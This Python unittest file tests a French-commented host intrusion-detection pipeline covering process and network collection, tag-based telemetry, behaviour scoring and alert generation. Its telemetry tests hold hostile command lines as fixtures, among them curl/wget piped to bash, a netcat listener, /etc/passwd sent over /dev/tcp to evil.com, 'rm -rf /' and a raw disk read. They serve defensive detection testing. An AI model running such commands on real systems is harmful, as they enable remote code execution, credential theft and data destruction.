"""
tests/test_sentinel.py — Tests pour phi_complexity/sentinel/

Couvre les 5 couches :
    - Couche 1 (host.py)      : HostCollector, HostEvent, EventType
    - Couche 2 (telemetry.py) : TelemetryNormalizer, CriticiteTelemetrie
    - Couche 3 (behavior.py)  : BehaviorAnalyzer, TypeBehavior
    - Couche 4 (bayesian.py)  : BayesianCorrelator, ScoreSentinel
    - Couche 5 (response.py)  : SentinelResponse, NiveauAlerte
    - __init__.py             : exports publics
"""

from __future__ import annotations

import json
import time
import unittest
from unittest.mock import patch

from phi_complexity.sentinel import (
    BayesianCorrelator,
    BehaviorAnalyzer,
    HostCollector,
    HostEvent,
    EventType,
    NiveauAlerte,
    ScoreSentinel,
    SentinelResponse,
    SignalComportemental,
    TelemetryNormalizer,
    TraceNormalisee,
    TypeBehavior,
)
from phi_complexity.sentinel.telemetry import CriticiteTelemetrie
from phi_complexity.sentinel.host import (
    _lire_proc_status,
    _lire_proc_cmdline,
)

# ──────────────────────────────────────────────
# HELPERS DE FABRICATION
# ──────────────────────────────────────────────


def _creer_event_processus(
    nom="python", pid=1234, cmdline="python script.py", timestamp=None
) -> HostEvent:
    return HostEvent(
        type=EventType.PROCESSUS,
        timestamp=timestamp or time.time(),
        source=f"pid:{pid}",
        description=f"Processus: {nom}",
        metadata={"pid": pid, "nom": nom, "cmdline": cmdline},
    )


def _creer_event_reseau(
    port_local=8080, port_remote=443, etat="ESTABLISHED", proto="tcp", timestamp=None
) -> HostEvent:
    return HostEvent(
        type=EventType.RESEAU,
        timestamp=timestamp or time.time(),
        source=f"port:{port_local}",
        description=f"{proto} port {port_local} → {port_remote} [{etat}]",
        metadata={
            "protocole": proto,
            "port_local": port_local,
            "port_remote": port_remote,
            "etat": etat,
        },
    )


def _creer_trace(
    event: HostEvent, criticite=CriticiteTelemetrie.INFO, tags=None
) -> TraceNormalisee:
    return TraceNormalisee(
        evenement=event,
        criticite=criticite,
        tags=tags or [],
    )


def _creer_signal(
    type_b=TypeBehavior.C2, confiance=0.75, mitre="T1071"
) -> SignalComportemental:
    return SignalComportemental(
        type=type_b,
        confiance=confiance,
        description=f"Signal {type_b.value}",
        traces_source=["test source"],
        mitre_technique=mitre,
    )


def _creer_score(score=0.30, niveau="MODÉRÉ") -> ScoreSentinel:
    return ScoreSentinel(
        score_final=score,
        niveau=niveau,
        score_os=0.20,
        score_commit=0.10,
        score_telemetrie=0.05,
        facteurs=["Test facteur"],
    )


# ──────────────────────────────────────────────
# COUCHE 1 — HOST
# ──────────────────────────────────────────────


class TestHostEvent(unittest.TestCase):
    def test_creation(self):
        event = _creer_event_processus()
        self.assertEqual(event.type, EventType.PROCESSUS)
        self.assertEqual(event.metadata["nom"], "python")

    def test_event_type_enum(self):
        self.assertIn(EventType.PROCESSUS, list(EventType))
        self.assertIn(EventType.RESEAU, list(EventType))
        self.assertIn(EventType.FICHIER, list(EventType))
        self.assertIn(EventType.INCONNU, list(EventType))


class TestHostCollector(unittest.TestCase):

    def test_instanciation_auto_detection(self):
        collector = HostCollector()
        self.assertIsInstance(collector._utiliser_proc, bool)

    def test_instanciation_force_subprocess(self):
        collector = HostCollector(utiliser_proc=False)
        self.assertFalse(collector._utiliser_proc)

    def test_instanciation_force_proc(self):
        collector = HostCollector(utiliser_proc=True)
        self.assertTrue(collector._utiliser_proc)

    @patch("phi_complexity.sentinel.host._collecter_processus_subprocess")
    @patch("phi_complexity.sentinel.host._collecter_reseau_subprocess")
    def test_collecter_tout_subprocess(self, mock_reseau, mock_proc):
        mock_proc.return_value = [_creer_event_processus()]
        mock_reseau.return_value = [_creer_event_reseau()]
        collector = HostCollector(utiliser_proc=False)
        events = collector.collecter_tout()
        self.assertEqual(len(events), 2)

    @patch("phi_complexity.sentinel.host._collecter_processus_linux")
    @patch("phi_complexity.sentinel.host._collecter_reseau_linux")
    def test_collecter_tout_linux(self, mock_reseau, mock_proc):
        mock_proc.return_value = [_creer_event_processus("bash")]
        mock_reseau.return_value = [_creer_event_reseau(port_local=22)]
        collector = HostCollector(utiliser_proc=True)
        events = collector.collecter_tout()
        self.assertEqual(len(events), 2)

    @patch("phi_complexity.sentinel.host._collecter_processus_subprocess")
    @patch("phi_complexity.sentinel.host._collecter_reseau_subprocess")
    def test_resume(self, mock_reseau, mock_proc):
        mock_proc.return_value = [_creer_event_processus() for _ in range(3)]
        mock_reseau.return_value = [_creer_event_reseau() for _ in range(2)]
        collector = HostCollector(utiliser_proc=False)
        resume = collector.resume()
        self.assertEqual(resume["total"], 5)
        self.assertEqual(resume["processus"], 3)
        self.assertEqual(resume["reseau"], 2)
        self.assertEqual(resume["methode"], "subprocess")

    @patch("phi_complexity.sentinel.host._collecter_processus_linux")
    @patch("phi_complexity.sentinel.host._collecter_reseau_linux")
    def test_resume_methode_proc(self, mock_reseau, mock_proc):
        mock_proc.return_value = []
        mock_reseau.return_value = []
        collector = HostCollector(utiliser_proc=True)
        resume = collector.resume()
        self.assertEqual(resume["methode"], "proc")

    @patch("os.listdir", side_effect=OSError("permission denied"))
    def test_lire_proc_processus_erreur_acces(self, _mock):
        from phi_complexity.sentinel.host import _collecter_processus_linux

        events = _collecter_processus_linux()
        self.assertEqual(events, [])

    def test_lire_proc_status_fichier_absent(self):
        result = _lire_proc_status(999999999)
        self.assertEqual(result, {})

    def test_lire_proc_cmdline_fichier_absent(self):
        result = _lire_proc_cmdline(999999999)
        self.assertEqual(result, "")

    @patch("subprocess.run", side_effect=OSError)
    def test_subprocess_processus_erreur(self, _):
        from phi_complexity.sentinel.host import _collecter_processus_subprocess

        events = _collecter_processus_subprocess()
        self.assertEqual(events, [])

    @patch("subprocess.run", side_effect=OSError)
    def test_subprocess_reseau_erreur(self, _):
        from phi_complexity.sentinel.host import _collecter_reseau_subprocess

        events = _collecter_reseau_subprocess()
        self.assertEqual(events, [])

    def test_reseau_linux_fichier_absent(self):
        """Si /proc/net/tcp n'existe pas, retourne liste vide."""
        from phi_complexity.sentinel.host import _collecter_reseau_linux

        with patch("builtins.open", side_effect=OSError):
            events = _collecter_reseau_linux()
        self.assertEqual(events, [])


# ──────────────────────────────────────────────
# COUCHE 2 — TELEMETRY
# ──────────────────────────────────────────────


class TestTelemetryNormalizer(unittest.TestCase):

    def setUp(self):
        self.norm = TelemetryNormalizer()

    def test_normaliser_processus_propre(self):
        event = _creer_event_processus("python")
        traces = self.norm.normaliser([event])
        self.assertEqual(len(traces), 1)
        self.assertIn("processus", traces[0].tags)
        self.assertEqual(traces[0].criticite, CriticiteTelemetrie.INFO)

    def test_normaliser_processus_suspect(self):
        event = _creer_event_processus("nc", cmdline="nc -lvnp 4444")
        traces = self.norm.normaliser([event])
        self.assertIn("processus_suspect", traces[0].tags)
        self.assertEqual(traces[0].criticite, CriticiteTelemetrie.SUSPECT)

    def test_normaliser_processus_avec_base64(self):
        event = _creer_event_processus(
            "python", cmdline="python -c 'exec(base64.b64decode(...))'"
        )
        traces = self.norm.normaliser([event])
        self.assertIn("encodage_base64", traces[0].tags)

    def test_normaliser_processus_tmp(self):
        event = _creer_event_processus(cmdline="/tmp/evil_script.sh")
        traces = self.norm.normaliser([event])
        self.assertIn("execution_tmp", traces[0].tags)

    def test_normaliser_processus_pipe_curl(self):
        event = _creer_event_processus(cmdline="curl http://evil.com/payload | bash")
        traces = self.norm.normaliser([event])
        self.assertIn("pipe_curl_bash", traces[0].tags)

    def test_normaliser_processus_pipe_wget(self):
        event = _creer_event_processus(cmdline="wget http://evil.com/payload | bash")
        traces = self.norm.normaliser([event])
        self.assertIn("pipe_wget_bash", traces[0].tags)

    def test_normaliser_processus_chmod_setuid(self):
        event = _creer_event_processus(cmdline="chmod +s /usr/bin/malware")
        traces = self.norm.normaliser([event])
        self.assertIn("setuid_suspect", traces[0].tags)

    def test_normaliser_processus_destruction(self):
        event = _creer_event_processus(cmdline="rm -rf /")
        traces = self.norm.normaliser([event])
        self.assertIn("destruction_systeme", traces[0].tags)

    def test_normaliser_processus_dev_tcp(self):
        event = _creer_event_processus(
            cmdline="bash -c 'cat /etc/passwd > /dev/tcp/evil.com/443'"
        )
        traces = self.norm.normaliser([event])
        self.assertIn("tcp_via_bash", traces[0].tags)

    def test_normaliser_processus_dev_udp(self):
        event = _creer_event_processus(
            cmdline="bash -c 'echo test > /dev/udp/evil.com/53'"
        )
        traces = self.norm.normaliser([event])
        self.assertIn("udp_via_bash", traces[0].tags)

    def test_normaliser_processus_raw_device(self):
        event = _creer_event_processus(cmdline="dd if=/dev/sda of=/tmp/disk.img")
        traces = self.norm.normaliser([event])
        self.assertIn("lecture_raw_device", traces[0].tags)

    def test_normaliser_reseau_port_normal(self):
        event = _creer_event_reseau(port_local=8080, port_remote=80)
        traces = self.norm.normaliser([event])
        self.assertIn("reseau", traces[0].tags)

    def test_normaliser_reseau_port_suspect(self):
        event = _creer_event_reseau(port_local=4444)
        traces = self.norm.normaliser([event])
        self.assertIn("port_suspect", traces[0].tags)
        self.assertEqual(traces[0].criticite, CriticiteTelemetrie.SUSPECT)

    def test_normaliser_reseau_connexion_tor(self):
        event = _creer_event_reseau(port_remote=9050, etat="ESTABLISHED")
        traces = self.norm.normaliser([event])
        self.assertIn("connexion_tor", traces[0].tags)

    def test_normaliser_reseau_port_ephemere_listen(self):
        event = _creer_event_reseau(port_local=60000, etat="LISTEN")
        traces = self.norm.normaliser([event])
        self.assertIn("port_ephemere_en_ecoute", traces[0].tags)

    def test_normaliser_reseau_established(self):
        event = _creer_event_reseau(port_local=443, etat="ESTABLISHED")
        traces = self.norm.normaliser([event])
        self.assertIn("connexion_etablie", traces[0].tags)

    def test_normaliser_event_inconnu(self):
        event = HostEvent(
            type=EventType.INCONNU,
            timestamp=time.time(),
            source="test",
            description="inconnu",
        )
        traces = self.norm.normaliser([event])
        self.assertEqual(traces[0].criticite, CriticiteTelemetrie.INFO)

    def test_filtrer_par_criticite(self):
        trace_info = _creer_trace(_creer_event_processus(), CriticiteTelemetrie.INFO)
        trace_suspect = _creer_trace(
            _creer_event_processus(), CriticiteTelemetrie.SUSPECT
        )
        filtrees = self.norm.filtrer_par_criticite(
            [trace_info, trace_suspect], CriticiteTelemetrie.SUSPECT
        )
        self.assertEqual(len(filtrees), 1)
        self.assertEqual(filtrees[0].criticite, CriticiteTelemetrie.SUSPECT)

    def test_statistiques(self):
        traces = [
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.INFO),
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.SUSPECT),
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.CRITIQUE),
        ]
        stats = self.norm.statistiques(traces)
        self.assertEqual(stats["info"], 1)
        self.assertEqual(stats["suspect"], 1)
        self.assertEqual(stats["critique"], 1)
        self.assertEqual(stats["total"], 3)

    def test_deduplication(self):
        ts = time.time()
        t1 = _creer_trace(_creer_event_processus(timestamp=ts), tags=["processus"])
        t1.evenement.timestamp = ts
        t2 = _creer_trace(_creer_event_processus(timestamp=ts + 10), tags=["processus"])
        t2.evenement.source = "pid:1234"
        t2.evenement.timestamp = ts + 10
        uniques = self.norm.deduplication([t1, t2], fenetre_secondes=60.0)
        # Ils ont la même source et les mêmes tags dans la fenêtre de 60s
        self.assertLessEqual(len(uniques), 2)

    def test_traces_suspectes(self):
        traces = [
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.INFO),
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.SUSPECT),
        ]
        suspectes = self.norm.traces_suspectes(traces)
        self.assertEqual(len(suspectes), 1)

    def test_rapport_telemetrie_vide(self):
        rapport = self.norm.rapport_telemetrie(None)
        self.assertIn("Aucune trace", rapport)

    def test_rapport_telemetrie_avec_traces(self):
        trace = _creer_trace(
            _creer_event_processus("nc"),
            CriticiteTelemetrie.SUSPECT,
            tags=["processus_suspect"],
        )
        rapport = self.norm.rapport_telemetrie([trace])
        self.assertIn("PHI-SENTINEL", rapport)
        self.assertIn("SUSPECT", rapport)


# ──────────────────────────────────────────────
# COUCHE 3 — BEHAVIOR
# ──────────────────────────────────────────────


class TestBehaviorAnalyzer(unittest.TestCase):

    def setUp(self):
        self.analyzer = BehaviorAnalyzer()

    def _trace_avec_tag(
        self, tag: str, criticite=CriticiteTelemetrie.SUSPECT
    ) -> TraceNormalisee:
        event = _creer_event_processus()
        trace = _creer_trace(event, criticite, tags=[tag])
        return trace

    def test_analyser_liste_vide(self):
        signaux = self.analyzer.analyser([])
        self.assertEqual(signaux, [])

    def test_detection_pipe_curl_bash(self):
        trace = self._trace_avec_tag("pipe_curl_bash")
        signaux = self.analyzer.analyser([trace])
        types = [s.type for s in signaux]
        self.assertIn(TypeBehavior.PERSISTANCE, types)

    def test_detection_setuid(self):
        trace = self._trace_avec_tag("setuid_suspect")
        signaux = self.analyzer.analyser([trace])
        types = [s.type for s in signaux]
        self.assertIn(TypeBehavior.ELEVATION, types)

    def test_detection_base64(self):
        trace = self._trace_avec_tag("encodage_base64")
        signaux = self.analyzer.analyser([trace])
        types = [s.type for s in signaux]
        self.assertIn(TypeBehavior.DEFENCE_EVASION, types)

    def test_detection_connexion_tor(self):
        trace = self._trace_avec_tag("connexion_tor")
        signaux = self.analyzer.analyser([trace])
        types = [s.type for s in signaux]
        self.assertIn(TypeBehavior.C2, types)

    def test_detection_destruction_systeme(self):
        trace = self._trace_avec_tag("destruction_systeme")
        signaux = self.analyzer.analyser([trace])
        types = [s.type for s in signaux]
        self.assertIn(TypeBehavior.CHIFFREMENT, types)

    def test_signaux_tries_par_confiance(self):
        traces = [
            self._trace_avec_tag("connexion_tor"),  # 0.75
            self._trace_avec_tag("encodage_base64"),  # 0.65
        ]
        signaux = self.analyzer.analyser(traces)
        if len(signaux) >= 2:
            self.assertGreaterEqual(signaux[0].confiance, signaux[1].confiance)

    def test_signaux_critiques_seuil(self):
        signaux = [
            _creer_signal(confiance=0.90),
            _creer_signal(confiance=0.50),
        ]
        critiques = self.analyzer.signaux_critiques(signaux, seuil_confiance=0.70)
        self.assertEqual(len(critiques), 1)
        self.assertEqual(critiques[0].confiance, 0.90)

    def test_score_global_vide(self):
        score = self.analyzer.score_global([])
        self.assertEqual(score, 0.0)

    def test_score_global_non_vide(self):
        signaux = [_creer_signal(confiance=0.80)]
        score = self.analyzer.score_global(signaux)
        self.assertGreater(score, 0.0)
        self.assertLessEqual(score, 1.0)

    def test_score_global_fusion_bayesienne(self):
        """Fusion de 2 signaux doit donner un score > chaque signal seul."""
        s1 = _creer_signal(confiance=0.60)
        s2 = _creer_signal(confiance=0.60, type_b=TypeBehavior.ELEVATION)
        score = self.analyzer.score_global([s1, s2])
        self.assertGreater(score, 0.60)

    def test_rapport_comportements_vide(self):
        rapport = self.analyzer.rapport_comportements([])
        self.assertIn("Aucun signal", rapport)

    def test_rapport_comportements_avec_signaux(self):
        signaux = [_creer_signal()]
        rapport = self.analyzer.rapport_comportements(signaux)
        self.assertIn("PHI-SENTINEL", rapport)
        self.assertIn("C2", rapport)

    def test_filtrer_par_criticite(self):
        traces = [
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.INFO),
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.SUSPECT),
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.CRITIQUE),
        ]
        filtrees = self.analyzer.filtrer_par_criticite(traces)
        self.assertEqual(len(filtrees), 2)  # SUSPECT + CRITIQUE

    def test_mitre_technique_present(self):
        trace = self._trace_avec_tag("pipe_curl_bash")
        signaux = self.analyzer.analyser([trace])
        persistance = [s for s in signaux if s.type == TypeBehavior.PERSISTANCE]
        if persistance:
            self.assertTrue(len(persistance[0].mitre_technique) > 0)

    def test_signal_to_dict(self):
        signal = _creer_signal()
        d = signal.to_dict()
        self.assertIn("type", d)
        self.assertIn("confiance", d)
        self.assertIn("mitre_technique", d)


# ──────────────────────────────────────────────
# COUCHE 4 — BAYESIAN
# ──────────────────────────────────────────────


class TestBayesianCorrelator(unittest.TestCase):

    def setUp(self):
        self.correlator = BayesianCorrelator()

    def test_score_par_defaut_sans_signaux(self):
        score = self.correlator.calculer_score()
        self.assertLess(score.score_final, 0.30)
        self.assertEqual(score.niveau, "FAIBLE")

    def test_score_augmente_avec_signaux_os(self):
        signaux = [
            _creer_signal(confiance=0.85),
            _creer_signal(confiance=0.80, type_b=TypeBehavior.ELEVATION),
        ]
        score_avec = self.correlator.calculer_score(signaux=signaux)
        score_sans = self.correlator.calculer_score()
        # Le score avec signaux doit être supérieur au prior seul
        self.assertGreater(score_avec.score_final, score_sans.score_final)

    def test_score_augmente_avec_commit_risque(self):
        score_faible = self.correlator.calculer_score(score_commit=0.0)
        score_risque = self.correlator.calculer_score(score_commit=0.80)
        self.assertGreater(score_risque.score_final, score_faible.score_final)

    def test_score_augmente_avec_telemetrie(self):
        # Créer des traces avec beaucoup de traces suspectes
        traces_normales = [
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.INFO)
        ] * 5
        traces_suspectes = [
            _creer_trace(_creer_event_processus(), CriticiteTelemetrie.SUSPECT)
        ] * 3
        score_normal = self.correlator.calculer_score(traces=traces_normales)
        score_suspect = self.correlator.calculer_score(traces=traces_suspectes)
        self.assertGreater(score_suspect.score_final, score_normal.score_final)

    def test_niveaux_classifies_correctement(self):
        # Score avec beaucoup de signaux critiques + commit risqué doit être plus élevé
        signaux_critiques = [_creer_signal(confiance=0.95) for _ in range(5)]
        score_fort = self.correlator.calculer_score(
            signaux=signaux_critiques, score_commit=0.90
        )
        score_baseline = self.correlator.calculer_score()
        # Le score doit être significativement supérieur au baseline (prior seul)
        self.assertGreater(score_fort.score_final, score_baseline.score_final)
        # Et doit être classifié au-delà de FAIBLE
        self.assertIn(score_fort.niveau, ["MODÉRÉ", "ÉLEVÉ", "CRITIQUE"])

    def test_score_dans_intervalle(self):
        for s_commit in [0.0, 0.25, 0.50, 0.75, 1.0]:
            score = self.correlator.calculer_score(score_commit=s_commit)
            self.assertGreaterEqual(score.score_final, 0.0)
            self.assertLessEqual(score.score_final, 1.0)

    def test_contributions_presentes(self):
        score = self.correlator.calculer_score(
            signaux=[_creer_signal()],
            score_commit=0.40,
        )
        self.assertGreaterEqual(score.score_os, 0.0)
        self.assertGreaterEqual(score.score_commit, 0.0)
        self.assertGreaterEqual(score.score_telemetrie, 0.0)

    def test_facteurs_identifies(self):
        score = self.correlator.calculer_score(
            signaux=[_creer_signal(confiance=0.90)],
            score_commit=0.70,
        )
        # Au moins un facteur doit être identifié
        self.assertGreater(len(score.facteurs), 0)

    def test_prior_personnalise(self):
        corr_conservateur = BayesianCorrelator(prior=0.01)
        corr_agressif = BayesianCorrelator(prior=0.50)
        score_c = corr_conservateur.calculer_score()
        score_a = corr_agressif.calculer_score()
        self.assertLess(score_c.score_final, score_a.score_final)

    def test_rapport_correlation(self):
        score = _creer_score()
        rapport = self.correlator.rapport_correlation(score)
        self.assertIn("PHI-SENTINEL", rapport)
        self.assertIn("MODÉRÉ", rapport)

    def test_score_to_dict(self):
        score = _creer_score()
        d = score.to_dict()
        self.assertIn("score_final", d)
        self.assertIn("niveau", d)
        self.assertIn("score_os", d)
        self.assertIn("score_commit", d)
        self.assertIn("score_telemetrie", d)

    def test_telemetrie_vide(self):
        score = self.correlator.calculer_score(traces=[])
        self.assertEqual(score.score_telemetrie, 0.0)


# ──────────────────────────────────────────────
# COUCHE 5 — RESPONSE
# ──────────────────────────────────────────────


class TestSentinelResponse(unittest.TestCase):

    def setUp(self):
        self.responder = SentinelResponse()

    def test_generer_alertes_score_nominal(self):
        """Score très bas ne génère pas d'alerte."""
        score = _creer_score(score=0.05, niveau="FAIBLE")
        alertes = self.responder.generer_alertes(score)
        self.assertEqual(len(alertes), 0)

    def test_generer_alertes_score_modere(self):
        score = _creer_score(score=0.35, niveau="MODÉRÉ")
        alertes = self.responder.generer_alertes(score)
        self.assertGreater(len(alertes), 0)

    def test_generer_alertes_avec_signaux(self):
        score = _creer_score(score=0.50, niveau="ÉLEVÉ")
        signaux = [_creer_signal(confiance=0.80)]
        alertes = self.responder.generer_alertes(score, signaux)
        # Au moins 2 alertes : score global + signal comportemental
        self.assertGreaterEqual(len(alertes), 2)

    def test_alertes_triees_par_score(self):
        score = _creer_score(score=0.70, niveau="ÉLEVÉ")
        signaux = [
            _creer_signal(confiance=0.90),
            _creer_signal(confiance=0.65, type_b=TypeBehavior.ELEVATION),
        ]
        alertes = self.responder.generer_alertes(score, signaux)
        if len(alertes) >= 2:
            self.assertGreaterEqual(alertes[0].score, alertes[1].score)

    def test_ioc_construit(self):
        score = _creer_score(score=0.50, niveau="ÉLEVÉ")
        alertes = self.responder.generer_alertes(score)
        if alertes:
            self.assertIsNotNone(alertes[0].ioc)
            self.assertIn("type", alertes[0].ioc)

    def test_exporter_ioc_json_retour_string(self):
        score = _creer_score(score=0.50)
        alertes = self.responder.generer_alertes(score)
        json_str = self.responder.exporter_ioc_json(alertes)
        bundle = json.loads(json_str)
        self.assertEqual(bundle["type"], "bundle")

    def test_exporter_ioc_json_fichier(self):
        import tempfile
        import os

        score = _creer_score(score=0.50)
        alertes = self.responder.generer_alertes(score)
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            chemin = f.name
        try:
            self.responder.exporter_ioc_json(alertes, chemin=chemin)
            self.assertTrue(os.path.exists(chemin))
            with open(chemin) as f:
                data = json.load(f)
            self.assertEqual(data["type"], "bundle")
        finally:
            if os.path.exists(chemin):
                os.unlink(chemin)

    def test_rapport_console_vide(self):
        rapport = self.responder.rapport_console([])
        self.assertIn("Aucune alerte", rapport)

    def test_rapport_console_avec_alertes(self):
        score = _creer_score(score=0.60, niveau="ÉLEVÉ")
        alertes = self.responder.generer_alertes(score)
        rapport = self.responder.rapport_console(alertes)
        self.assertIn("PHI-SENTINEL", rapport)

    def test_rapport_markdown_vide(self):
        rapport = self.responder.rapport_markdown([])
        self.assertIn("Aucune alerte", rapport)

    def test_rapport_markdown_avec_alertes(self):
        score = _creer_score(score=0.70, niveau="ÉLEVÉ")
        signaux = [_creer_signal(confiance=0.80)]
        alertes = self.responder.generer_alertes(score, signaux)
        rapport = self.responder.rapport_markdown(alertes, titre="Test Sentinel")
        self.assertIn("Test Sentinel", rapport)
        self.assertIn("phi-sentinel", rapport)

    def test_politique_de_reponse_defaut(self):
        score = _creer_score(score=0.80, niveau="CRITIQUE")
        signaux = [_creer_signal(confiance=0.95)]
        alertes = self.responder.generer_alertes(score, signaux)
        politique = self.responder.politique_de_reponse(alertes)
        self.assertIn("bloquer_pr", politique)
        self.assertIn("escalader", politique)

    def test_politique_de_reponse_sans_alertes(self):
        politique = self.responder.politique_de_reponse([])
        self.assertFalse(politique["bloquer_pr"])
        self.assertFalse(politique["escalader"])

    def test_politique_personnalisee(self):
        from phi_complexity.sentinel.response import NiveauAlerte, Alerte

        alerte = Alerte(
            niveau=NiveauAlerte.CRITIQUE,
            titre="Test",
            description="Critique",
            score=0.95,
        )
        pol_custom = {
            NiveauAlerte.CRITIQUE: "BLOCK_ALL|ESCALATE|ISOLATE",
            NiveauAlerte.ALERTE: "NOTIFY_TEAM",
            NiveauAlerte.AVERTISSEMENT: "LOG_ONLY",
            NiveauAlerte.INFO: "LOG_ONLY",
        }
        politique = self.responder.politique_de_reponse([alerte], politique=pol_custom)
        self.assertTrue(politique["bloquer_pr"])
        self.assertTrue(politique["escalader"])
        self.assertTrue(politique["isoler"])

    def test_niveau_alerte_depuis_niveau(self):
        self.assertEqual(NiveauAlerte.depuis_niveau("FAIBLE"), NiveauAlerte.INFO)
        self.assertEqual(
            NiveauAlerte.depuis_niveau("MODÉRÉ"), NiveauAlerte.AVERTISSEMENT
        )
        self.assertEqual(NiveauAlerte.depuis_niveau("ÉLEVÉ"), NiveauAlerte.ALERTE)
        self.assertEqual(NiveauAlerte.depuis_niveau("CRITIQUE"), NiveauAlerte.CRITIQUE)
        self.assertEqual(NiveauAlerte.depuis_niveau("INCONNU"), NiveauAlerte.INFO)

    def test_alerte_to_dict(self):
        from phi_complexity.sentinel.response import Alerte

        alerte = Alerte(
            niveau=NiveauAlerte.ALERTE,
            titre="Test",
            description="description",
            score=0.75,
            signaux=["signal 1"],
        )
        d = alerte.to_dict()
        self.assertEqual(d["niveau"], "alerte")
        self.assertAlmostEqual(float(d["score"]), 0.75, places=2)

    def test_signal_critique_dans_alertes(self):
        """Signal avec confiance >= 0.85 → NiveauAlerte.CRITIQUE."""
        score = _creer_score(score=0.90, niveau="CRITIQUE")
        signaux = [_creer_signal(confiance=0.90)]
        alertes = self.responder.generer_alertes(score, signaux)
        niveaux = [a.niveau for a in alertes]
        self.assertIn(NiveauAlerte.CRITIQUE, niveaux)

    def test_exporter_ioc_json_dossier_cree(self):
        """Le répertoire de sortie est créé automatiquement."""
        import tempfile
        import os

        score = _creer_score(score=0.50)
        alertes = self.responder.generer_alertes(score)
        with tempfile.TemporaryDirectory() as tmpdir:
            chemin = os.path.join(tmpdir, "subdir", "ioc.json")
            self.responder.exporter_ioc_json(alertes, chemin=chemin)
            if alertes:
                self.assertTrue(os.path.exists(chemin))


# ──────────────────────────────────────────────
# TEST MODULE __init__
# ──────────────────────────────────────────────


class TestSentinelInit(unittest.TestCase):
    def test_exports_publics(self):
        from phi_complexity import sentinel

        for nom in [
            "HostCollector",
            "HostEvent",
            "EventType",
            "TelemetryNormalizer",
            "TraceNormalisee",
            "BehaviorAnalyzer",
            "SignalComportemental",
            "TypeBehavior",
            "BayesianCorrelator",
            "ScoreSentinel",
            "SentinelResponse",
            "NiveauAlerte",
        ]:
            self.assertTrue(hasattr(sentinel, nom), f"Manquant: {nom}")


if __name__ == "__main__":
    unittest.main()
